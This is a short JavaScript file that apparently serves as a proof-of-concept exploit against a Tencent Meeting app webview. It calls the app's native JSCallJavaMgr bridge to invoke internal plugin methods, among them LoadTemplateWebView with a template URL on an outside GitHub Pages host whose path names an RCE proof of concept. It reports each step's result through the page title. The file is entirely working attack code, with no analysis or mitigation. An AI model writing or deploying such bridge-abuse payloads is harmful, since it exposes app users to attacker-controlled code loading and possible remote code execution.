(function(){
  document.title='P88TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P88CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P88TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P88TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var tpl='https://gitwhs.github.io/wm-poc-rce/p88tpl.html';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['T1','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p88'}],
    ['T4','CommonPlugin','LoadTemplateWebView',{url:official,template_url:tpl,template_id:'p88mix'}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P88TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P88-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
